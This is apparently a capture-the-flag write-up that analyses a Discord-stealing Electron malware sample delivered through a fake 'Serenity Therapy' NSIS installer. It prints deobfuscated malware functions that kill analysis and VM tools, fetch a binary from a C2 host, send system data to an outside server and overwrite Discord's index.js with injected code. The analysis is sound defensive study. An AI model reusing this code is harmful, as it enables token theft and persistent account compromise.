# Subatomic

### Challenge Description
Forela is in need of your assistance. They were informed by an employee that their Discord account had been used to send a message with a link to a file they suspect is malware. The message read: "Hi! I've been working on a new game I think you may be interested in it. It combines a number of games we like to play together, check it out!". The Forela user has tried to secure their Discord account, but somehow the messages keep being sent. They need your help to understand this malware and regain control of their account! **Warning:** This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. Once the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.

### Static Analysis
- Some basic information about the binary.\
![general_info_1](general_info_1.png)\
![general_info_2](general_info_2.png)\
![general_info_3](general_info_3.png)\
From above screenshot we can see that we have one executable which claims that it is a Serenity Therapy Installer. Under Digital Signature we can see that this binary is signed by Microsoft but when checkin the certificate we can that the certificate is not valid.\
Loading the executable in pestudio we can see that the following.
![sig-info](sig-info.png)

- Getting the information from VirusTotal.
![virus-total-res](virus-total-res.png)\
We can see that Virtus Total detects it makrs as a dropper type of malware. From the details section we can get the Imphash. An `Imphash` is a `unique identifier` for a Portable Executable (PE) file, like an EXE or DLL. It's *calculated based on the libraries and functions the executable imports, and the order in which they are imported*.\
We can get more information from other tabs like behavior which can tell us the MITRE ATT&CK Tactics and Techniques used. One that is very useful here is the Network Communications under behaviors tab.\
![c2_addr](c2-addr.png)

- Getting more information about the executable using Detect It Easy.\
One major infomration that we can get from this is that the Data section says NSIS data.\
![nsis_data](NSIS_data.png)

NSIS stands for `Nullsoft Scriptable Install System`, is an open-source tool used to create Windows installers. NSIS uses a scripting language to define the installation process, allowing for complex installation logic. This we can say that it's a zip file with some code which knows what to pull out from archive where to put it and execute it.

- Extracting Data from the given binary, we'll use 7zip for extracting the contents from the installer.\
We can see the following entities after extracting the installer file.\
![after-extraction](after-extraction.png)\
From this we can see that there are 2 main files that are interesting, first is the .`nsi` file and second is a zip file `app-32.7z` rest all normal ones. Once we complete the extraction of app-32.7z we can one major portion that we can focus on that is under `$PLUGINSDIR\app-32/resources` we have `app.asar` and `elevevate.exe`.\
An ASAR file, short for `Atom Shell Archive`, is a simple, tar-like archive format primarily used by applications built with the Electron framework. Electron is a framework that allows developers to build cross-platform desktop applications using web technologies like HTML, CSS, and JavaScript.\

- Extracting elements from app.asar file.\ We are going to use npm fisrt for downloading and asar and then we are going to use asar for exract the app.asar file. We'll do this using the following commands.\
```cmd
npm install -g asar js-beautify
asar extract app.asar unpacked
```
![asar-extracted](asar-extracted.png)\

- The resultant will be a folder with node modules, app.js and package.json file. We can see the dependencies using the package.json file.
- We can see that the app.js is obfuscated. We can beauitfy the code using js-beautify.\
![beautify](code-after-beautify.png)\
But We cannot extract any relevant information using this code so we'll have to debug it.

- Before we start debugging let's check the `.nsi` file that we got after extracting the archives. This file is a part of the nullsoft installer so it might contain some information about the malware.\
While examining this file we can see that the registry is being accessed multiple times with a specific GUID and with that same GUID some functions like CreateMutex is being called.
![guid_1](guid_1.png)
![guid_2](guid_2.png)\
Another thing that we can be sure of from multiple things above is the `SerenityThreapyInstaller 1.0` is highly suspicious for us.

### Dynamic Analysis
- We can take the obfuscated script and then using VSCode we can debug it. We just have to go to the debug tab and click on `Run and Debug` and then select `node.js` as the running environment.
- This gave error with the installed version of `@primno`. For resolving it we remove the package from node-modules and then reinstall it using `npm install @primno`. When trying again got this same with `sqlite3`. Same we can resolve by remove package from node-modules and then reinstalling using `npm install sqlite3`.
- Now when we start we are able to launch the debug section, but here now I'm unable to pause using the pause button. Unless we can pause we'll not be able to the stack components, scripts loaded etc. For doing this we have to press F6 multiple times only then it pauses.\
Once we pause under the call stack we can see there is `<anonymous>` method which is coming from eval method, and same we can observe under script loaded tab as well. This is coming from the obfuscated code which has loaded the unobfuscated part. So now we have to unobfuscated code which we can analyze.
![un-obf-code](un-obf-code.png)

### Java Script File Analysis
Now that we have the main file we'll analyze it. From a general point follwoing is the functionality of the code:
- Steal Discord tokens and user data.
- Extract browser cookies, saved passwords, and autofill data.
- Inject malicious code into Discord installations.
- Send all collected data to a remote server (https://illitmagnetic.site/api/).
- Detect and evade virtual machines and analysis environments.

Code Block with working
- checkVm()
    - First it checks if the total memory size is greater than 2GB and if there is a hostname as per one list then the program exits.
    - Next it check for some running process if found then it kills those processes.\
    ```js
    function checkVm() {
    if(Math.round(totalmem() / (1024 * 1024 * 1024)) < 2) process.exit(1);
    if([
        'bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb',
        'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r',
        'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj',
        'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS', 'aranmoo', 'kathlcox', 'rotembarne', 'bilawson', 'seanwalla', 'gugonzal', 'zachwood', 'theresap', 'joyedwar', 'richar', 'dburns', 'willipe'
    ].includes(hostname().toLowerCase())) process.exit(1);

    const tasks = execSync('tasklist');
    [
        'opera', 'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd',
        'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg',
        'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver',
        'vmwareservice', 'vmwaretray', 'discordtokenprotector'
    ].forEach((task) => {
        if(tasks.includes(task))
        execSync(`taskkill /f /im ${task}.exe`);
    });
    };
    ```

- checkCmdInstallation()
    - This code block checks for the existance of cmd.exe at `C:\Windows\System32\`.
    - If it's not present then same binary is downloaded at `%USERPROFILE%\Documents\`.\
    ```js
    async function checkCmdInstallation() {
    return await new Promise(async(resolve) => {
        if(!existsSync('C:\\Windows\\system32\\cmd.exe')) {
            const request = await fetch(options.api + 'cmd-file', {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'duvet_user': options?.user_id
                }
            });
    
            const response = await request.json();
            writeFileSync(join(process.env.USERPROFILE, 'Documents','cmd.exe'), Buffer.from(response?.buffer), {
                flag: 'w'
            });
            process.env.ComSpec = join(process.env.USERPROFILE, 'Documents', 'cmd.exe');
            resolve();
        } else {
            process.env.ComSpec = 'C:\\Windows\\system32\\cmd.exe';
            resolve();
        };
    });
    };
    ```

- newInjection()
    - This function collects the system information like user_id, computer_name, RAM, CPU, distro, network info etc.
    - Then sends it to the C2 server.
    - One more operation it performs is discordInjection.
    ```js
    async function newInjection() {
    const system_info = await si?.osInfo();
    const injections = await discordInjection();

    const network = await fetch('https://ipinfo.io/json', {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
    });

    const network_data = await network.json();

    fetch(options.api + 'new-injection', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            duvet_user: options?.user_id,
            computer_name: userInfo()?.username,
            ram: Math.round(totalmem() / (1024 * 1024 * 1024)),
            cpu: cpus()?.[0]?.model,
            injections,
            distro: system_info?.distro,
            uptime: uptime() * 1000,
            network: {
                ip: network_data?.ip,
                country: network_data?.country,
                city: network_data?.city,
                region: network_data?.region,
            }
        })
    });
    };
    ```
    - discordInjection()
        - First it finds the discord installation folder.
        - Gets the location of index.js file of discord, performs get request to the C2.
        - Fetches code to infect the index.js and then restarts the discord to load the infected code.
        ```js
        async function discordInjection() {
        const infectedDiscords = [];

        [join(process.env.LOCALAPPDATA, 'Discord'), join(process.env.LOCALAPPDATA, 'DiscordCanary'), join(process.env.LOCALAPPDATA, 'DiscordPTB')]
        ?.forEach(async(dir) => {
            if(existsSync(dir)) {
                if(!readdirSync(dir).filter((f => f?.startsWith('app-')))?.[0]) return;
                const path = join(dir, readdirSync(dir).filter((f => f.startsWith('app-')))?.[0], 'modules', 'discord_desktop_core-1');
                const discord_index = execSync('where /r . index.js', { cwd: path })?.toString()?.trim();
                
                if(discord_index) infectedDiscords?.push(
                    dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')
                );

                const request = await fetch(options.api + 'injections', {
                    method: 'GET',
                    headers: {
                        duvet_user: options?.user_id,
                        logout_discord: options?.logout_discord
                    }
                });

                const data = await request.json();

                writeFileSync(discord_index, data?.discord, {
                    flag: 'w'
                });

                await kill(['discord', 'discordcanary', 'discorddevelopment', 'discordptb']);
                exec(`${join(dir, 'Update.exe')} --processStart ${dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')}.exe`, function(err) {
                    if(err) {};
                });
            };
        });

        return infectedDiscords;
        };
        ```
    - There are multiple functions which includes extracting firefox cookies, getting discord tokens, stealing firefox tokens, checking the tokens obtained, collecting all browsers data etc.

Now we have all the required information for answering the questions

### Complete
